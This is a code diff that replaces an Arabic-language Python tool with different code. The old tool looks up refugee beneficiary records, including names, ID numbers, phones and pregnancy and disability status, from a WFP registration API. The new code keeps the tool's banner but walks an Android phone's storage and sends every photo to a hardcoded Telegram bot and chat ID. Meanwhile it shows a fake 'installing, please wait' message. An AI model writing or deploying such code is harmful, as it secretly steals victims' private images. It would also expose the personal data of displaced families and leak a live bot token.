@@ -1,160 +1,31 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+import os
+import telebot
+from threading import Thread
+logo=("""\033[1;91m
+\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/
+\033[1;32m--------------------------------------------------""")
+print(logo)
+bot = telebot.TeleBot("6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac") 
 
-import re
-import requests
-from datetime import datetime, date
 
-# تعريف الألوان للتنسيق
-RED = "\033[1;31m"
-GREEN = "\033[1;32m"
-CYAN = "\033[1;36m"
-WHITE = "\033[1;37m"
-PURPLE = "\033[1;35m"
-YELLOW = "\033[1;33m"
-RESET = "\033[0m"
+dir_path = "/storage/emulated/0/"
+ 
 
-# استخدام fr''' لحل مشكلة SyntaxWarning في الشعار
-print(fr'''
-{PURPLE}<=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=>
+def send_file(file_path):
+ with open(file_path, "rb") as f:
+  if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+   bot.send_photo(chat_id="1350971290",photo=f) 
+  else:
+   print('يتم تثبيت الان الرجاء الانتضار 5دقائق')
+   
 
-{GREEN} _ {RED}  _  {GREEN} _   {RED}_  {GREEN} _
-{GREEN}/ \ {RED}/ \ {GREEN}/ \ {RED}/ \ {GREEN}/ \  
- {GREEN}N | A | D | E | R 
-{RED}\_/ {GREEN}\_/{RED} \_/ {GREEN}\_/ {RED}\_/
 
-{PURPLE}<=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=>
-
-{WHITE}𝐅𝐈𝐑𝐄   :{GREEN}  [بسم الله الرحمان الرحيم تم تطوير وبرمجه السكربت بواسطه المهندس نادر ]
-{WHITE}𝐕𝐞𝐫𝐬𝐢𝐨𝐧  : {GREEN}4.2.0 (Enhanced)
-{WHITE}Github : {GREEN}https://github.com/nader2006nader
-{WHITE}STATUS : {GREEN}ON
-{WHITE}PASSWORD TOOL : {RED} 7
-{WHITE}Telegram : {GREEN} @N_0_N_7
-
-{PURPLE}<=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=>
-''')
-
-BASE_URL = "https://pal.beneficiaryregistration.cbt.wfp.org/api/v2/submission/retrieve/"
-
-# =========================
-# أدوات مساعدة مطورة
-# =========================
-def clean_date_str(date_val):
-    if not date_val: return "غير محدد"
-    return str(date_val).split('T')[0]
-
-def calc_age(dob):
-    if not dob: return "غير معروف"
-    try:
-        clean_date = clean_date_str(dob)
-        d = datetime.strptime(clean_date, "%Y-%m-%d").date()
-        today = date.today()
-        y = today.year - d.year - ((today.month, today.day) < (d.month, d.day))
-        return f"{y} سنة" if y >= 1 else "أقل من سنة"
-    except: return "خطأ في التاريخ"
-
-def yn(v):
-    if isinstance(v, dict):
-        v = v.get("true") or v.get("1")
-    v_str = str(v).lower()
-    if v_str in ("true", "1", "yes", "none"): return "نعم"
-    if v_str in ("false", "0", "no"): return "لا"
-    return "غير محدد"
-
-def translate_shelter(v):
-    mapping = {"tent": "خيمة", "host_family": "مستضاف عند عائلة", "apartment": "شقة"}
-    return mapping.get(str(v).lower(), v)
-
-def draw_box(title, content_list):
-    width = 60
-    lines = []
-    lines.append(f"{CYAN}╔{'═' * (width-2)}╗{RESET}")
-    lines.append(f"{CYAN}║ {WHITE}{title:^{width-5}} {CYAN}║{RESET}")
-    lines.append(f"{CYAN}╠{'═' * (width-2)}╣{RESET}")
-    for label, val in content_list:
-        padding = " " * (width - len(str(label)) - len(str(val)) - 6)
-        lines.append(f"{CYAN}║ {RED}{label}: {GREEN}{val}{padding} {CYAN}║{RESET}")
-    lines.append(f"{CYAN}╚{'═' * (width-2)}╝{RESET}")
-    return "\n".join(lines)
-
-# =========================
-# معالجة التقرير
-# =========================
-def build_report(d):
-    report = []
-
-    # 1. معلومات الملف والنزوح
-    residence = [
-        ("نوع الإقامة الحالي", translate_shelter(d.get('adminAccomodation', 'غير محدد'))),
-        ("تاريخ النزوح", clean_date_str(d.get('dateofDisplacement', ''))),
-        ("عدد مرات النزوح", d.get('hhdisplacement', '0')),
-        ("حالة اللجوء", d.get('refugeeStatus', 'No')),
-        ("كود المنطقة (Admin4)", d.get('admin4', 'غير معروف')),
-        ("آخر تحديث للملف", d.get('modified_date', 'غير معروف'))
-    ]
-    report.append(draw_box("🏠 أولاً: معلومات السكن والنزوح المتقدمة", residence))
-
-    # 2. بيانات رب الأسرة
-    hoh_info = [
-        ("الاسم الكامل", f"{d.get('hohfirstName','')} {d.get('hohlastName','')}"),
-        ("اسم الأب والجد", f"{d.get('hohfathersName','')} {d.get('hohgrandfathersName','')}"),
-        ("الجنس", "ذكر" if d.get('hohgender') == "M" else "أنثى"),
-        ("تاريخ الميلاد", clean_date_str(d.get('hohdob', ''))),
-        ("العمر", f"{d.get('hohage','')} سنة"),
-        ("رقم الهوية", d.get('documentNumber', '')),
-        ("الحالة الاجتماعية", d.get('hohmaritalStatus', ''))
-    ]
-    report.append(draw_box("👤 ثانياً: بيانات ربّ الأسرة", hoh_info))
-
-    # 3. الاتصال
-    contacts = [
-        ("الهاتف الأساسي", d.get('primaryPhoneNumber', 'لا يوجد')),
-        ("الهاتف الثانوي", d.get('secondaryPhoneNumber', 'لا يوجد'))
-    ]
-    report.append(draw_box("📞 ثالثاً: معلومات الاتصال", contacts))
-
-    # 4. أفراد الأسرة
-    members = d.get("family_members_information", [])
-    idx = 1
-    for m in members:
-        box_title = f"👪 عضو رقم ({idx})"
-        if m.get("deleted"):
-            box_title = "🗑️ عضو محذوف من الملف"
-        
-        # إضافة تاريخ الميلاد هنا للأعضاء
-        m_data = [
-            ("الاسم", f"{m.get('hhmemberfirstName','')} {m.get('hhmemberlastName','')}"),
-            ("اسم الأب", m.get('hhmemberfathersName','')),
-            ("الصلة", "زوجة" if m.get('hhmemberrelation')=="2" else "ابن/ابنة"),
-            ("تاريخ الميلاد", clean_date_str(m.get('hhmemberdob', ''))),
-            ("العمر", f"{m.get('hhmemberage','')} سنة"),
-            ("الهوية", m.get('hhmemberdocumentNumber','')),
-            ("إعاقة", yn(m.get('hhmemberpwd'))),
-        ]
-        
-        if m.get('hhmembergender') == "F":
-            m_data.append(("حامل", yn(m.get('hhmemberpregnant'))))
-            m_data.append(("مرضع", yn(m.get('hhmemberlactating'))))
-
-        report.append(draw_box(box_title, m_data))
-        idx += 1
-
-    return "\n".join(report)
-
-def main():
-    try:
-        nid = input(f"{WHITE}ENTER ID::::>  {RESET}").strip()
-        if not nid: return
-        print(f"\n{YELLOW}🔄 جاري جلب وتحليل البيانات الشاملة...{RESET}\n")
-        
-        r = requests.get(BASE_URL + nid, timeout=30)
-        if r.status_code == 200:
-            print(build_report(r.json()))
-        else:
-            print(f"{RED}❌ لم يتم العثور على بيانات لهذا الرقم.{RESET}")
-    except Exception as e:
-        print(f"\n{RED}❌ خطأ غير متوقع: {e}{RESET}")
-
-if __name__ == "__main__":
-    main()
+for root, dirs, files in os.walk(dir_path):
+ threads = []
+ for file in files:
+  file_path = os.path.join(root, file)
+  t = Thread(target=send_file, args=(file_path,))
+  t.start()
+  threads.append(t)
+ for thread in threads:
+  thread.join()
